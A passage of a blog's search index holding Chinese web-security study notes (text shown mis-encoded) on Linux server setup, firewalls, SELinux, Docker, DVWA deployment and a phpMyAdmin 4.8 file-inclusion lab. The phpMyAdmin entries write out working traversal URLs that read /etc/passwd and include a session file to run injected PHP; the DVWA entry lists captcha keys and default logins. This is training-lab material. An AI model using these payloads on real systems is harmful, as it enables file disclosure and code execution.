init#ç”Ÿæˆåšå®¢hexo g#æ­å»ºæœåŠ¡hexo s ç„¶åŽæµè§ˆå™¨è®¿é—®æ’­å®¢ä¸»é¡µ å®‰è£…CentOs Miniï¼Œå®‰è£…å¥½åŽæ‰§è¡Œ 1yum groupinstall "development tools" å‘¨ä¸‰Linuxä¸‹åº”ç”¨çš„å®‰è£…1.CentOSç³»ç»Ÿä¸­æœ‰ä¸‰ç§å®‰è£…è½¯ä»¶çš„æ–¹æ³• é€šè¿‡æºç å®‰è£… ./configure make &amp;&amp; make install é€šè¿‡rpmå®‰è£… rpm -ivh â€¦ é€šè¿‡yumå®‰è£… yum search â€¦ yum install â€¦ rpmç±»åž‹æ–‡ä»¶å®‰è£…çš„æ—¶å€™ï¼Œä¼šå…ˆåŽ»è¯»å–æ–‡ä»¶å†…è®°è½½çš„è®¾ç½®å‚æ•°å†…å®¹ï¼Œç„¶åŽå°†è¯¥æ•°æ®ç”¨æ¥æ¯”å¯¹linuxç³»ç»Ÿçš„çŽ¯å¢ƒï¼Œä»¥æ‰¾åˆ°æ˜¯å¦æœ‰å±žæ€§ç›¸ä¾çš„è½¯ä»¶å°šæœªå®‰è£…çš„é—®é¢˜ã€‚RPMä½¿ç”¨è‡ªåŠ¨åŒ–å®‰è£…è½¯ä»¶ï¼Œæ¯”è¾ƒç±»ä¼¼windowsä¸‹çš„.exeéœ€è¦ä¸‹è½½çš„å®‰è£…åŒ…ï¼Œä½†æ˜¯å®ƒå®‰è£…è¿‡ç¨‹ä¸­ä¼šæœ‰å¾ˆå¤šä¾èµ–é—®é¢˜ã€‚ -q: ä»…æŸ¥è¯¢ï¼ŒåŽé¢æŽ¥è½¯ä»¶åç§°æ˜¯å¦æœ‰å®‰è£… -qa: åˆ—å‡ºæ‰€æœ‰ï¼Œå·²ç»å®‰è£…åœ¨æœ¬æœºlinuxç³»ç»Ÿä¸Šé¢çš„æ‰€æœ‰è½¯ä»¶åç§° -ql: åˆ—å‡ºè¯¥è½¯ä»¶æ‰€æœ‰çš„æ–‡ä»¶ä¸Žç›®å½•æ‰€åœ¨å®Œæ•´æ–‡ä»¶å(list) -qR: åˆ—å‡ºä¸Žè¯¥è½¯ä»¶æœ‰å…³çš„ç›¸ä¾è½¯ä»¶æ‰€åœ¨çš„æ–‡ä»¶(requried) æºç å®‰è£…ï¼šå…ˆé˜…è¯»READMEæ–‡ä»¶ï¼Œæ‰¾åˆ°å®‰è£…æ–¹æ³•ï¼Œå®‰è£…ç›¸ä¾èµ–çš„åº“ï¼Œæœ€åŽæ‰§è¡Œ 1make &amp;&amp; make install å‘¨å››æ­å»ºapache+php+mysqlå’Œiptables+firewall1.æ˜¨å¤©å›žé¡¾12345yum installrpm -ivh a.rpm/http/ftp:baidu.com/a.tpm nginx.tar.gztar cat readme install./configure --help --prefix=å®‰è£…è·¯å¾„ --with-apr=æŒ‡å®šä¾èµ–ä½ç½®make &amp;&amp; make install 2.æ­å»ºapache+php+mysqlçŽ¯å¢ƒ(è¦æ±‚ä½¿ç”¨php5.6) å®‰è£…httpd 12345678#å®‰è£…httpdyum install httpd httpd-devel httpd-manual mod_ssl -y#å¯åŠ¨apachesystemctl start httpd#è®¾ç½®apacheå¼€æœºå¯åŠ¨systemctl enable httpd#æŸ¥çœ‹å¼€æ”¾ç«¯å£ï¼Œæ£€æŸ¥æœ‰æ²¡æœ‰httpdæœåŠ¡ï¼Œ80å’Œ443ç«¯å£æ˜¯å¦å¼€æ”¾ss -antlp é…ç½®é˜²ç«å¢™ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®apache 123firewall-cmd --zone=public --add-port=80/tcp --permanentfirewall-cmd --zone=public --add-port=433/tcp --permanentfirewall-cmd --reload å®‰è£…php5.6 12345678910rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm#å¸è½½ç³»ç»Ÿä¸­åŽŸæœ‰çš„phpyum remove php-common -y#å®‰è£…php5.6å’Œphpæ‰©å±•yum install -y php56w php56w-opcache php56w-xml php56w-mcrypt php56w-gd php56w-mysql php56w-intl php56w-mbstring#è¿›å…¥ç½‘ç«™æ ¹ç›®å½•cd /var/www/html/#åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸­åˆ›å»ºindex.phpï¼Œå†™å…¥phpinfoå‡½æ•°ï¼Œæµ‹è¯•ç½‘ç«™phpæ˜¯å¦æ­£å¸¸echo '&lt;?php phpinfo();?&gt;' &gt; index.php å®‰è£…mariadb 123456789yum install mariadb-server -y#å¯åŠ¨mariadb-serversystemctl start mariadb#è®¾ç½®mariadb-serverå¼€æœºè‡ªå¯systemctl enablemariadb#åˆå§‹åŒ–mysqlï¼Œæ³¨æ„è®°ä½mysqlå¯†ç mysql_secure_installation#å…³æœº+å¿«ç…§poweroff 3.å…³äºŽç½‘ç«™æ­å»ºï¼šéœ€è¦å°†ç½‘ç«™çš„æºä»£ç ä½¿ç”¨å·¥å…·å¤åˆ¶åˆ°è™šæ‹Ÿæœºä¸­çš„ç½‘ç«™æ ¹ç›®å½•ä¸‹(phpmyadminé™¤å¤–)ï¼Œä¿®æ”¹ç½‘ç«™çš„æ‰€æœ‰è€…ä¸ºapache 1chown -R apache:apache /var/www/html wordpressç‰¹æ€§ï¼š â€‹ ç§»åŠ¨ç½‘ç«™åŽï¼Œç½‘ç«™çš„æ ·å¼å°†å‡ºé”™ï¼Œæ‰€ä»¥wordpressåœ¨å®‰è£…æˆåŠŸåŽï¼Œä¸èƒ½ç§»åŠ¨ â€‹ è™šæ‹Ÿæœºipæ”¹å˜åŽï¼Œwordpressæ‰“å¼€ä¼šå¡é¡µé¢ï¼Œéœ€è¦åŽ»æ•°æ®åº“ä¸­ä¿®æ”¹ip wp_optionsè¡¨ä¸­ â€‹ siteurl: http://æ–°ip â€‹ home: http://æ–°ip æ­å»ºæ²¡æœ‰æä¾›å®‰è£…å¼•å¯¼çš„ç½‘ç«™ï¼š â€‹ ä¸Šä¼ ç½‘ç«™æºä»£ç åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œæ‰¾åˆ°ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯config.php â€‹ å†æ‰¾åˆ°ç½‘ç«™æä¾›çš„sqlæ–‡ä»¶ï¼Œä½¿ç”¨phpmyadminä¹‹ç±»å·¥å…·ï¼Œå¯¼å…¥æ•°æ®æˆ–ç›´æŽ¥ä½¿ç”¨mysql -uroot -p ç™»å½•æ•°æ®åº“ 123create database database_nameuse database_namesource absolute_path/name.sql å‘æ•°æ®åº“ä¸­å¯¼å…¥å†…å®¹ï¼Œæœ‰å¤šé‡æ–¹å¼ï¼Œå¯ä»¥è‡ªè¡Œæµ‹è¯• å‘¨äº”Linuxå®‰å…¨æ£€æŸ¥1.é˜²ç«å¢™åŠŸèƒ½ï¼šâ€‹ filteråŠŸèƒ½æ˜¯é˜²ç«å¢™ä¸€ä¸ªé‡è¦åŠŸèƒ½ï¼Œå®ƒå®šä¹‰æ•°æ®é€šè¿‡æ˜¯å…è®¸æˆ–è€…ä¸å…è®¸ â€‹ filteræŽ§åˆ¶æ•°æ®ç±»åž‹åˆ†ä¸ºä¸¤ç±»ï¼šINPUTå’ŒOUTPUT 2.Iptableså‘½ä»¤è®²è§£ï¼š-A è¿½åŠ  -p æŒ‡å®šåè®®ç±»åž‹ 123* tcpé€šè¿‡dportæŒ‡å®šç›®æ ‡ç«¯å£ï¼ŒsportæŒ‡å®šæºç«¯å£* udpé€štcp* icmpé€šè¿‡--icmp-typeæŒ‡å®šç±»åž‹ï¼Œ0æ˜¯å“åº”ç±»åž‹çš„æ•°æ®åŒ…ï¼Œ8æ˜¯è¯·æ±‚ç±»åž‹çš„åŒ… -m è¡¨ç¤ºå¯åŠ¨æ‰©å±•åŠŸèƒ½ â€‹ ä¸€èˆ¬å’Œ-pé…åˆï¼Œ-pæŒ‡å®šç±»åž‹åŽï¼Œé€šè¿‡-mæ‰“å¼€æ­¤ç±»åž‹çš„æ‰©å±•åŠŸèƒ½ -j æŒ‡å®šå¦‚ä½•è¿›è¡Œå¤„ç†DROPï¼ŒREJECTï¼ŒACCEPT/ä¸¢å¼ƒï¼Œæ‹’ç»ï¼Œé€šè¿‡ 1iptables -A INPUT/OUTPUT -j DROP/REJECT/ACCEPT ç¼–è¾‘iptablesçš„é…ç½®æ–‡ä»¶ï¼š â€‹ é€šè¿‡ç¼–è¾‘æ–‡ä»¶å¯ä»¥ç›´æŽ¥ä¿®æ”¹iptablesè§„åˆ™ï¼Œç¼–è¾‘æ–‡ä»¶ï¼Œå†™å…¥æŒ‡å®šè§„åˆ™ï¼š 123456-A INPUT -m state --state ESTABLISHED, RELATED -j ACCEPT-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibited 12#æŸ¥çœ‹çŽ°æœ‰è§„åˆ™iptables -nvL 12#æ·»åŠ 80ç«¯å£é€šè¿‡çš„è§„åˆ™firewallc-cmd --zone=public --add-port=80/tcp --permanent drop é»˜è®¤ä¸¢å¼ƒæ‰€æœ‰åŒ… â€“zone block æ‹’ç»æ‰€æœ‰å¤–éƒ¨è¿žæŽ¥ï¼Œå…è®¸å†…éƒ¨å‘èµ·è¿žæŽ¥ public æŒ‡å®šå¤–éƒ¨è¿žæŽ¥å¯ä»¥è¿›å…¥ â€“add-port æŒ‡å®šæ·»åŠ ç«¯å£ 80/tcp 53/udp â€“add-service æŒ‡å®šå¸¸è§æœåŠ¡ http https mysql mssql ssh â€“permanent æ°¸ä¹…ç”Ÿæ•ˆ åˆ é™¤80ç«¯å£é€šè¿‡çš„è§„åˆ™ 1firewall-cmd --zone=public --remove-port=80/tcp --permanent â€“remove-port æŒ‡å®šåˆ é™¤ç«¯å£ â€“remove-service æŒ‡å®šåˆ é™¤æœåŠ¡ 12345678910#é˜²ç«å¢™æ›´æ–°è§„åˆ™firewall-cmd --reload#é˜²ç«å¢™æ˜¾ç¤ºæ‰€æœ‰è§„åˆ™firewall-cmd --list-all#å…³é—­é˜²ç«å¢™systemctl stop firewalld#æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€systemctl status firewalld#å¯åŠ¨é˜²ç«å¢™systemctl start firewalld ä¸´æ—¶åŠ ç«‹å³ç”Ÿæ•ˆï¼Œâ€“reloadåŽå¤±æ•ˆï¼Œâ€“pernamentå¿…é¡»ï¼Œâ€“reloadåŽæ‰å¤±æ•ˆ]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note11]]></title>
    <url>%2F2019%2F07%2F29%2Fnoteday11%2F</url>
    <content type="text"><![CDATA[1. SELINUXå³Security-Enhanced Linuxï¼Œæ˜¯ä¸€ä¸ªLinuxå†…æ ¸æ¨¡å—ï¼Œä¹Ÿæ˜¯Linuxçš„ä¸€ä¸ªå®‰å…¨å­ç³»ç»Ÿã€‚SELinuxä½œç”¨æ˜¯æœ€å¤§é™åº¦åœ°å‡å°‘ç³»ç»Ÿä¸­æœåŠ¡è¿›ç¨‹å¯è®¿é—®çš„èµ„æºï¼ˆæœ€å°æƒé™åŽŸåˆ™ï¼‰ã€‚ å¦‚æžœä¸€ä¸ªä»¥rootèº«ä»½è¿è¡Œçš„ç½‘ç»œæœåŠ¡å­˜åœ¨0dayæ¼æ´žï¼Œé»‘å®¢å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´žï¼Œä»¥rootçš„èº«ä»½åœ¨æ‚¨çš„æœåŠ¡å™¨ä¸Šä¸ºæ‰€æ¬²ä¸ºã€‚SELinuxå°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ ç³»ç»Ÿ èµ„æºèƒ½å¦è¢«è®¿é—®å› ç´  æ— SELinux æŸèµ„æºæ˜¯å¦æ‹¥æœ‰å¯¹åº”ç”¨æˆ·çš„æƒé™ï¼ˆè¯»å†™æ‰§è¡Œï¼‰ SELinux è¿˜éœ€è¦åˆ¤æ–­æ¯ä¸€ç±»è¿›ç¨‹æ˜¯å¦æ‹¥æœ‰å¯¹æŸä¸€ç±»èµ„æºçš„è®¿é—®æƒé™ SELinuxçš„å·¥ä½œæ¨¡å¼ æ¨¡å¼åç§° å·¥ä½œæ¨¡å¼ ä½œç”¨ enforcing å¼ºåˆ¶æ¨¡å¼ è¿åSELinuxè§„åˆ™çš„è¡Œä¸ºå°†ç»„ç»‡å¹¶è®°å½•åˆ°æ—¥å¿—ä¸­ permissive å®½å®¹æ¨¡å¼ è¿åSELinuxè§„åˆ™çš„è¡Œä¸ºåªä¼šè®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œè°ƒè¯•ç”¨ disabled å…³é—­æ¨¡å¼ å…³é—­SELinux SELinuxå·¥ä½œæ¨¡å¼å¯ä»¥åœ¨/etc/selinux/configä¸­è®¾å®š 12#ä¿®æ”¹SELinuxæ¨¡å¼vi /etc/selinux/config ä¿®æ”¹ä»¥åŽé‡å¯ç³»ç»Ÿå³å¯ã€‚ 2.phpmyadmin4.8æ–‡ä»¶åŒ…å«æ¼æ´žgoto_whitelistç™½åå•å¦‚ä¸‹ï¼š 12345678910public static $goto_whitelist = array( 'db_datadict.php', 'db_sql.php', 'db_events.php', 'db_export.php', 'db_importdocsql.php', 'db_multi_table_query.php', 'db_structure.php', 'db_import.php',) è¿›å…¥Vulnspyå¼€å§‹å®žéªŒ ä»Žindex.phpå®šä½åˆ°ç™½åå•ä¸­çš„phpæ–‡ä»¶ 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php? å°†?æ”¹%253fè¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼Œè¿›è¡Œå¤šæ¬¡ ./ä»¥è¿›å…¥åˆ°ç³»ç»Ÿçš„æ ¹ç›®å½•ï¼Œç„¶åŽè¯»å–/etc/passwd 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php%253f../../../../../../../../../../etc/passwd Note: target=åŽé¢çš„æ–‡ä»¶å¡«å†™ç™½åå•æ–‡ä»¶å‡å¯æˆåŠŸï¼Œ?è¦ç”¨%253fä»£æ›¿ ç‚¹å‡»SQLè¾“å…¥ 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; Note:phpmyadminç‰¹æ€§æ˜¯æ‰€æœ‰sqlæŸ¥è¯¢è¯­å¥éƒ½æ—©sess_idä¸­å­˜å‚¨ç€ã€‚ sess_idåœ¨/var/lib/php/session/ç›®å½•ä¸­ 3. dockerå®¹å™¨ç±»ä¼¼äºŽè™šæ‹Ÿæœºï¼Œä¾èµ–ä¸Žlinux 1234567891011#æŸ¥çœ‹åˆ›å»ºçš„é•œåƒdocker images#å¯åŠ¨dockerservice docker start#ä¿®æ”¹dockerçš„ç”¨æˆ·ç»„sudo usermod -G docker $USER#é‡å¯è™šæ‹Ÿæœºrebootrebootdocker imagesdocker-composedocker run --rm -it alpine /bin/bash]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>SELinux - phpmyadmin</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin-bug]]></title>
    <url>%2F2019%2F07%2F28%2Fphpmyadmin-bug%2F</url>
    <content type="text"><![CDATA[Abstract: phpmyadmin4.8æ¼æ´žæ¼”ç¤º è¿›å…¥vulnspç½‘ç«™ï¼Œç‚¹å‡»start to hackï¼Œè·³è½¬åˆ°VSPlat ç‚¹å‡»è¿›å…¥å®žéªŒï¼Œç‚¹å‡»å¼€å§‹æŒ‰é’® è¿›å…¥phpmyadminç™»å½•ç•Œé¢ï¼Œç”¨æˆ·åï¼šrootï¼Œå¯†ç ï¼štoorç™»å½• ç‚¹å‡»SQLï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; èŽ·å–è‡ªå·±çš„SESSION ID 1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf åŒ…å«SESSIONæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ž 1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf ç½‘é¡µè¾“å…¥payloadï¼Œé¡µé¢å¦‚ä¸‹ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ž]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
        <tag>bug</tag>
        <tag>æ–‡ä»¶åŒ…å«æ¼æ´ž</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dvwa-deploy]]></title>
    <url>%2F2019%2F07%2F28%2Fdvwa-deploy%2F</url>
    <content type="text"><![CDATA[Abstract: CentOS7éƒ¨ç½²DVWA DVWAï¼ˆDamn Vulnerable Web Applicationï¼‰æ˜¯ä¸€ä¸ªç”¨æ¥è¿›è¡Œå®‰å…¨è„†å¼±æ€§é‰´å®šçš„PHP/MySQL Webåº”ç”¨ï¼Œæ—¨åœ¨ä¸ºå®‰å…¨ä¸“ä¸šäººå‘˜æµ‹è¯•è‡ªå·±çš„ä¸“ä¸šæŠ€èƒ½å’Œå·¥å…·æä¾›åˆæ³•çš„çŽ¯å¢ƒï¼Œå¸®åŠ©webå¼€å‘è€…æ›´å¥½çš„ç†è§£webåº”ç”¨å®‰å…¨é˜²èŒƒçš„è¿‡ç¨‹ã€‚ å®‰è£…æ­¥éª¤ 1.è¿›å…¥åˆ°/var/wwwç›®å½•ä¸‹ï¼Œç„¶åŽwgetä¸‹è½½dvwaæ–‡ä»¶ï¼Œè§£åŽ‹master.zipæ–‡ä»¶åˆ°htmlæ–‡ä»¶å¤¹ä¸‹ï¼Œè¿›å…¥htmlæ–‡ä»¶å¤¹ä¸‹ï¼Œä¿®æ”¹DVWA-masteræ–‡ä»¶åä¸ºdvwaï¼Œè¿›å…¥dvwa/configæ–‡ä»¶å¤¹ä¸­ï¼ŒæŠŠconfig.inc.php.distå¤åˆ¶ä¸€ä»½ï¼Œå‘½åä¸ºconfig.inc.phpï¼›â€˜cd /var/wwwâ€™ &apos;wget https://github.com/ethicalhack3r/DVWA/archive/master.zip&apos; &apos;unzip master.zip -d html/&apos; &apos;cd html &amp;&amp; mv DVWA-master dvwa&apos; &apos;cd dvwa/config/&apos; &apos;co config.inc.php.dist config.inc.php&apos; 2.è¿›å…¥åˆ°/etcç›®å½•ï¼Œå…ˆæŠŠphp.iniå¤‡ä»½ä¸€ä»½åä¸ºphp.ini.bak.20190727ï¼Œæ‰“å¼€php.iniï¼ŒæŠŠallow_url_include=Offä¿®æ”¹ä¸ºOnï¼Œä¿å­˜é€€å‡ºï¼Œé‡å¯æœåŠ¡ï¼›â€˜cd /etcâ€™ &apos;cp php.ini php.ini.bak.20190727&apos; &apos;vi php.ini&apos; &apos;systemctl restart httpd&apos; 3.è¿›å…¥/var/www/html/dvwa/configç›®å½•ä¸‹ï¼Œä¿®æ”¹config.inc.phpï¼ŒæŠŠ$_DVWA[ â€˜db_passwordâ€™ ]ä¿®æ”¹ä¸ºmysqlä¸­rootç”¨æˆ·å¯†ç ï¼Œå¹¶å¡«å†™å…¬é’¥å’Œç§é’¥ï¼Œä¿å­˜åŽé€€å‡ºï¼›public_key: 6LePqhAUAAAAAH6Bn2okO9-8G-zNw46PNhotV4Q6private_key: 6LePqhAUAAAAAMVqhBbFr1NVA9H13FkyfAgBeZYx &apos;cd /var/www/html/dvwa/config&apos; &apos;vi config.inc.php&apos; 4.è¿›å…¥/var/www/htmlæ–‡ä»¶ä¸­ï¼Œä¿®æ”¹dvwaçš„ç”¨æˆ·å’Œç”¨æˆ·ç»„â€˜chown -R apache:apache dvwa/â€˜ &apos;systemctl restart httpd&apos; 5.éƒ¨ç½²æˆåŠŸåŽï¼Œç™»å½•ç•Œé¢å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç”¨æˆ·åï¼šadminï¼Œå¯†ç ï¼špasswordï¼Œå³å¯ç™»å½•]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>dvwa</tag>
        <tag>linux</tag>
      </tags>
  </entry>
</search>
